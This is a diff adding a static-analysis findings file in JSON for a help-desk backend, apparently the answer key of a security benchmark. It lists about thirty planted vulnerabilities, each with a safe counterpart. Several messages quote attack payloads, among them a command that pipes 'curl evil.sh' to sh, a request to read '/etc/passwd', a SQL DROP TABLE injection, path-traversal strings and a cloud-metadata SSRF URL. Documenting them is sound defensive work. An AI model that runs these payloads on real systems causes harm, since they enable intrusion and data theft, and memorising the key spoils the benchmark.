@@ -1,0 +1,765 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.command-injection-pandoc",
+      "path": "backend/src/attachments/attachments.service.ts",
+      "start": {
+        "line": 189,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 189,
+        "col": 75,
+        "offset": 0
+      },
+      "extra": {
+        "message": "normalizeIntakeForm() interpolates the client-supplied `presentationFormat` (from POST /attachments/:id/normalize-intake-form body) directly into a shell command string passed to execSync(), which runs via /bin/sh -c. A value like `plain -o /tmp/x; curl evil.sh|sh #` executes arbitrary OS commands on the server. The sibling method renderCaseFileBundle() shows the safe fix: validate against an allowlist and use execFileSync with shell:false.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-digest-script",
+      "path": "backend/src/reports/reports.service.ts",
+      "start": {
+        "line": 26,
+        "col": 1,
+        "offset": 0
+      },
+      "end": {
+        "line": 42,
+        "col": 2,
+        "offset": 0
+      },
+      "extra": {
+        "message": "runDigestScript() spawns `bash -c \"./scripts/render-digest.sh ${args.join(' ')}\"` with shell:true when useShell=true. renderCustomDigest() (line 352-360, reachable from POST /reports/digest/custom with a client-controlled `template` body field) calls this with useShell=true and unvalidated user input, allowing arbitrary shell command injection (e.g. template = \"x; cat /etc/passwd\"). renderStandardDigest() is the safe twin: it validates against STANDARD_DIGEST_TEMPLATES and calls with useShell=false.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: OS Command Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection-function-constructor",
+      "path": "backend/src/escalations/escalations.service.ts",
+      "start": {
+        "line": 191,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 196,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewUrgencyFormula() builds `new Function('metrics', 'return ' + formula)` from the client-supplied `formula` field (POST /escalations/:id/urgency-preview body, reachable by team_lead/support_admin). This executes arbitrary JavaScript on the server, e.g. formula = \"(()=>{require('child_process').execSync('id')})()\" or similar sandbox-escape payloads, yielding full RCE in the Node process.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-queryrawunsafe",
+      "path": "backend/src/reports/reports.service.ts",
+      "start": {
+        "line": 338,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 347,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "overdueDigestForTimezone() interpolates `timezone` directly into a raw SQL string executed via prisma.$queryRawUnsafe. The value is sourced from GET /reports/dashboard/due-today, which reads it straight from the client-controlled `dashboard_timezone` cookie (reports.controller.ts:124-128) with no allowlist or escaping. A payload like `UTC'; DROP TABLE \"Ticket\"; --` breaks out of the string literal for full SQL injection. The endpoint requires no special role.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: SQL Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.upload.unrestricted-file-upload-path-traversal",
+      "path": "backend/src/organizations/organizations.service.ts",
+      "start": {
+        "line": 397,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 412,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "uploadBrandingLogo() writes the uploaded file using the raw, attacker-controlled `file.originalname` into BRANDING_WEB_DIR (public/branding, a web-served directory) with no MIME-type check, size limit, or filename sanitization. An originalname of `../../../server.js` or similar traverses out of the upload directory, and arbitrary extensions/content (e.g. an .html file with script) can be uploaded and served publicly, enabling stored XSS or file overwrite. The sibling uploadBrandingLogoSafe() fixes this with a MIME allowlist, size cap, generated UUID filename, and a private directory.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-434: Unrestricted Upload of File with Dangerous Type",
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.mass-assignment-privilege-escalation",
+      "path": "backend/src/auth/auth.service.ts",
+      "start": {
+        "line": 196,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 208,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "restoreWorkspaceLayout() base64-decodes and JSON.parses the client-supplied `exportCode` (POST /auth/workspace-layout/restore/:exportCode) and spreads it wholesale into a Prisma `User` update (`{ fullName: undefined, ...layout }`). Any authenticated user (including a customer_user) can craft an exportCode encoding `{\"role\":\"support_admin\"}` (or isActive, organizationId, passwordHash, etc.) to escalate their own privileges. The sibling restoreDisplayName() is the safe fix: it only ever copies the single `fullName` field.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes",
+            "CWE-862: Missing Authorization"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.idor-unauthenticated-internal-notes-leak",
+      "path": "backend/src/tickets/tickets.service.ts",
+      "start": {
+        "line": 512,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 531,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewPartnerHandoff() is exposed at an unauthenticated (@Public) endpoint (POST /tickets/partner-handoff/preview) and decides whether to return a ticket's internal notes based solely on the client-supplied `membershipStatus` field. Any anonymous caller can set membershipStatus:'enterprise' in the request body to retrieve internal support notes for any ticket reference. The sibling previewPartnerHandoffVerified() correctly derives the tier from the organization's own stored `plan` field instead of trusting the caller's claim.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.xpath-injection-cached-tracking-number",
+      "path": "backend/src/tickets/shipment-tracking.service.ts",
+      "start": {
+        "line": 44,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 51,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "lookupByCachedTrackingNumber() builds an XPath-style query `/shipments/shipment[@id='${cachedTrackingNumber}']` using the raw, unescaped `cached_tracking_number` cookie value (set client-side via POST /tickets/shipment-tracking/cache with no validation, then read in GET /tickets/shipment-tracking). A crafted cookie value such as `x'] | //shipment | //*[@id='` widens the query to match/leak unrelated shipment records outside the caller's own organization manifest. The sibling lookupByCachedTrackingNumberSafe() calls escapeXPathString() before interpolation.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-643: XPath Injection",
+            "CWE-91: XML Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-badge-lookup",
+      "path": "backend/src/directory/directory.service.ts",
+      "start": {
+        "line": 14,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 18,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findEmployeeByBadgeId() interpolates the client-supplied `badgeId` (GET /users/:id/directory-profile, id param) directly into an LDAP filter `(employeeId=${badgeId})` with no escaping. A value like `*)(uid=*))(|(uid=*` alters the filter's logical structure, potentially matching arbitrary directory entries or bypassing the intended single-record lookup. The same unescaped pattern also appears in checkSiteDispatchEligibility() (line 32) and checkCoverageApprovalAuthority() (line 65) in this file, both driven by client-controlled `badgeId` query params from config-admin.controller.ts. Contrast with verifyGroupMembership() in this same file, which correctly calls escapeLdapFilter() on its input.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-90: LDAP Injection"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ssti-handlebars-user-template",
+      "path": "backend/src/notifications/notifications.service.ts",
+      "start": {
+        "line": 79,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 82,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewDigestGreeting() compiles the entirely client-controlled `template` string (POST /notifications/digest-greeting/preview body, reachable by team_lead/support_admin) with Handlebars.compile(). Handlebars templates can access helpers and, via crafted expressions, walk the prototype chain / constructor (`{{#with this.constructor}}...{{/with}}`-style gadgets), enabling server-side template injection and potential remote code execution. The sibling previewDigestGreetingSafe() only ever compiles a fixed, hardcoded template string and treats the recipient name as data.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection",
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ssti-handlebars-ticket-subject",
+      "path": "backend/src/tickets/tickets.service.ts",
+      "start": {
+        "line": 655,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 656,
+        "col": 50,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderPortalCaseCard() builds the Handlebars template *source itself* by string-interpolating the user-controlled `ticket.subject` (set at ticket creation) into `cardSource`, then compiles it with Handlebars.compile(). A ticket subject containing Handlebars syntax (e.g. `{{#with this}}{{lookup (lookup this 'constructor') 'name'}}{{/with}}`) is interpreted as template code rather than literal text, enabling server-side template injection.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Code Injection",
+            "CWE-1336: Improper Neutralization of Special Elements Used in a Template Engine"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.jwt-alg-none-fallback-unverified-decode",
+      "path": "backend/src/organizations/organizations.service.ts",
+      "start": {
+        "line": 253,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 281,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "processCostAllocationAssertion() verifies the client-supplied `assertion` JWT with `algorithms: ['HS256', 'none']`, allowing an attacker to submit an unsigned token (alg:none) that passes verification. Worse, if jwt.verify throws for any reason, the code falls back to `jwt.decode(assertion)`, which performs NO signature verification at all \u2014 any caller-crafted JWT (signed or not) is trusted and its `costCenter` claim is written into the organization record. The sibling processAuditLogAssertion() is the correct version: it requires a real secret, verifies with only ['HS256'], and rejects on any failure.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.team-policy-document",
+      "path": "backend/src/config-admin/config-admin.service.ts",
+      "start": {
+        "line": 82,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 91,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getTeamPolicyDocument() joins the client-supplied `fileName` (GET /teams/policy-document?fileName=) into POLICY_DIR with path.join() and reads it with no containment check. A value like `../../../../etc/passwd` or `../../../.env` escapes POLICY_DIR and reads arbitrary files readable by the process. The sibling getTeamPolicyDocumentSafe() resolves the path and verifies it still starts with POLICY_DIR before reading.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.runbook-read",
+      "path": "backend/src/kb/kb.service.ts",
+      "start": {
+        "line": 256,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 265,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "readRunbook() joins the client-supplied `fileName` (GET /kb/runbooks/:fileName) into RUNBOOKS_DIR with no containment check before reading the file, allowing directory traversal to read arbitrary files on disk. The sibling readRunbookSafe() strips the value to path.basename() first, preventing traversal.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.escalation-brief-letterhead",
+      "path": "backend/src/reports/reports.service.ts",
+      "start": {
+        "line": 416,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 449,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderEscalationBriefWithLetterhead() joins the client-supplied `letterhead` query parameter (GET /reports/escalation-brief/:id/print-branded) into BRANDING_DIR without resolving/validating the result stays inside that directory, then reads and inlines the file content into an HTML response returned to the caller \u2014 allowing arbitrary file read (and exfiltration via the rendered HTML) through path traversal. The sibling renderEscalationBriefWithLetterheadSafe() resolves the path and rejects anything outside BRANDING_DIR.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Path Traversal"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xss.unescaped-html-escalation-brief",
+      "path": "backend/src/reports/reports.service.ts",
+      "start": {
+        "line": 405,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 410,
+        "col": 20,
+        "offset": 0
+      },
+      "extra": {
+        "message": "renderEscalationBrief() (and renderEscalationBriefWithLetterhead() at lines 442-448) interpolate `escalation.reason` and `raisedBy.fullName` directly into an HTML string returned with Content-Type text/html, with no HTML-escaping. Since escalation.reason is free-text supplied when an escalation is created (CreateEscalationDto.reason), an escalation reason containing `<script>...</script>` executes when the brief is printed/viewed. renderTicketSummary() (line 502-506) in the same file shows the correct pattern, using an explicit escapeHtml() helper.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-79: Cross-Site Scripting"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.ssrf.reference-preview-fetch",
+      "path": "backend/src/kb/kb.service.ts",
+      "start": {
+        "line": 217,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 227,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewCitedReference() calls fetch() on the client-supplied `sourceUrl` (POST /kb/manage/reference-preview) with no host/scheme restriction, letting an authenticated staff user make the server issue requests to arbitrary internal hosts (e.g. http://169.254.169.254/latest/meta-data/, internal admin panels) and returns the first 500 characters of the response body. The sibling previewApprovedReference() restricts to https and a fixed allowlist of vetted hostnames.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-918: Server-Side Request Forgery"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.redirect.open-redirect-kiosk-complete",
+      "path": "backend/src/kiosk-access/kiosk-access.controller.ts",
+      "start": {
+        "line": 51,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 59,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "completeKioskVisit() is a @Public (unauthenticated) endpoint that redirects to the client-supplied `returnTo` body field with zero validation. An attacker can craft a link to POST /kiosk/visits/:visitId/complete (or trick a booth flow into it) with returnTo pointing to an external phishing site. The sibling completeFrontDeskVisit() validates returnTo against a fixed BOOTH_SCREENS allowlist.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: Open Redirect"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.redirect.open-redirect-notification-digest",
+      "path": "backend/src/notifications/notifications.controller.ts",
+      "start": {
+        "line": 35,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 44,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "openFromDigest() redirects to the client-supplied `return_to` query parameter with no validation. An attacker sending a crafted digest-link-style URL (GET /notifications/:id/open?return_to=https://evil.example) causes an authenticated user's browser to be redirected off-site. The sibling openFromDigestSafe() checks return_to against a fixed NOTIFICATION_HOME_SCREENS allowlist.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: Open Redirect"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.cors.reflected-origin-with-credentials",
+      "path": "backend/src/organizations/organizations.controller.ts",
+      "start": {
+        "line": 49,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 62,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "statusWidget() reflects the request's Origin header back verbatim in Access-Control-Allow-Origin and also sets Access-Control-Allow-Credentials: true, for any origin, with no validation. This permits any website to make credentialed cross-origin requests to this endpoint on behalf of a visiting user. The sibling statusWidgetVerified() only reflects the origin once it matches the ticket's own organization domain.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.missing-role-check-ops-stacktrace-leak",
+      "path": "backend/src/ops/ops.controller.ts",
+      "start": {
+        "line": 39,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 52,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "OpsController has no @Roles()/@UseGuards(RolesGuard) restriction, only the global JwtAuthGuard (app.module.ts APP_GUARD), so ticket_batch_glitch_003() is reachable by any authenticated user regardless of role (including customer_user), leaking system-wide ticket counts with no organization/team scoping. On any error (e.g. malformed `window` query param) it also returns the raw Node error stack trace (`(err as Error).stack`) directly in the JSON response, exposing internal file paths and code structure to any logged-in user.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-leak.stack-trace-behind-cookie-gate",
+      "path": "backend/src/tickets/tickets.controller.ts",
+      "start": {
+        "line": 132,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 155,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "retryLegacyCaseImport() returns the raw exception `message` and `stack` in the API response whenever the client-controlled `migration_workbench_session` cookie equals 'expanded'. Since this cookie is entirely client-set (there is no server-issued/signed session tied to it), any caller can set that cookie value themselves to unlock full stack traces on demand, revealing internal file paths and implementation details.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-209: Generation of Error Message Containing Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.hardcoded-default-jwt-secret",
+      "path": "backend/src/auth/auth.module.ts",
+      "start": {
+        "line": 16,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 16,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The JWT signing secret falls back to the hardcoded literal 'dev-only-change-me-in-production' whenever the JWT_SECRET environment variable is unset. The identical fallback is used in jwt.strategy.ts:21 to verify tokens, and again for DELEGATE_ASSERTION_SECRET in auth.service.ts (lines 328, 352, 366). If a deployment forgets to set these environment variables, an attacker can forge valid session JWTs and coverage-delegate credentials using this publicly-known default secret.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-default-encryption-key",
+      "path": "backend/src/common/at-rest-cipher.ts",
+      "start": {
+        "line": 14,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 61,
+        "offset": 0
+      },
+      "extra": {
+        "message": "encrypt()/decrypt() derive the AES-256-GCM key from COMPLIANCE_DATA_KEY, which defaults to an empty string when unset. `''.padEnd(64,'0')` yields an all-zero 32-byte key, so any deployment missing this environment variable silently encrypts compliance-sensitive fields (e.g. regulatory identifiers in organizations.service.ts linkComplianceId) with a well-known, predictable key.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-321: Use of Hard-coded Cryptographic Key",
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.mass-assignment-portal-profile",
+      "path": "backend/src/organizations/organizations.service.ts",
+      "start": {
+        "line": 344,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 357,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "updatePortalProfile() spreads the entire client-supplied `updates` object into a Prisma `organization.update` call (`data: { ...updates }`). A customer_user calling POST /organizations/:id/portal-profile on their own org can set any Organization column (e.g. `notes`, `domain` used for portal-invite domain checks, or other internal fields) beyond the intended name/domain fields. The sibling updatePortalProfileSafe() destructures only `name` and `domain` before writing.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.regex-injection-team-scope-bypass",
+      "path": "backend/src/reports/reports.service.ts",
+      "start": {
+        "line": 171,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 172,
+        "col": 60,
+        "offset": 0
+      },
+      "extra": {
+        "message": "slaCase() builds `new RegExp('^' + user.teamId + ':' + reference + '$', 'i')` from the client-supplied `reference` query parameter without escaping regex metacharacters, then uses it to filter tickets fetched for the entire system. Because '|' has lower precedence than '^'/'$' anchors, a reference value containing an unescaped alternation (e.g. `x|.*`) can produce a pattern whose second alternative matches any string, letting a team_lead retrieve SLA case details for tickets belonging to other teams \u2014 bypassing the intended team-scoping.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-863: Incorrect Authorization",
+            "CWE-1333: Inefficient Regular Expression Complexity"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.data-exposure.cleartext-bank-account",
+      "path": "backend/src/organizations/organizations.service.ts",
+      "start": {
+        "line": 190,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 206,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "linkBillingAccount() stores the customer's bank account number in plaintext inside the organization's free-text `notes` field (`Billing account on file: ${accountNumber}`). Contrast with linkComplianceId() immediately below it, which correctly seals equivalent sensitive data with AtRestCipher before persisting. Any admin (or anything that can read `notes`, e.g. via the general `organizations.get`/`list` endpoints) can read the raw account number.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-312: Cleartext Storage of Sensitive Information"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.info-leak.sensitive-headers-logged",
+      "path": "backend/src/webhooks/api-key.guard.ts",
+      "start": {
+        "line": 27,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 78,
+        "offset": 0
+      },
+      "extra": {
+        "message": "On a failed API-key lookup, ApiKeyGuard logs the full raw request headers (`JSON.stringify(req.headers)`), which may include other sensitive headers such as Authorization/cookie values sent alongside a bad x-api-key, persisting them into application logs.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-532: Insertion of Sensitive Information into Log File"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.client-controlled-bcrypt-cost-factor",
+      "path": "backend/src/users/users.service.ts",
+      "start": {
+        "line": 153,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 153,
+        "col": 89,
+        "offset": 0
+      },
+      "extra": {
+        "message": "onboardSeasonalStaff() uses `dto.hashRounds || 4` as the bcrypt cost factor, where hashRounds is a client-supplied, unbounded number (SeasonalStaffOnboardDto only requires @IsNumber()). A caller can request hashRounds:1, producing a trivially weak password hash for the new agent account (versus the industry-standard 12 used everywhere else in the codebase, including the sibling onboardSeasonalStaffVerified()).",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.dos.unbounded-compliance-export",
+      "path": "backend/src/audit/audit.service.ts",
+      "start": {
+        "line": 46,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 55,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "exportForComplianceReview() (reachable via GET /audit-logs/compliance-export) applies no row limit, so a caller can request an unbounded date range and force the entire audit-log table's history to be loaded into memory in a single response. The sibling exportForComplianceReviewPaginated() caps results to MAX_COMPLIANCE_EXPORT_ROWS with cursor-based paging.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-400: Uncontrolled Resource Consumption",
+            "CWE-770: Allocation of Resources Without Limits or Throttling"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
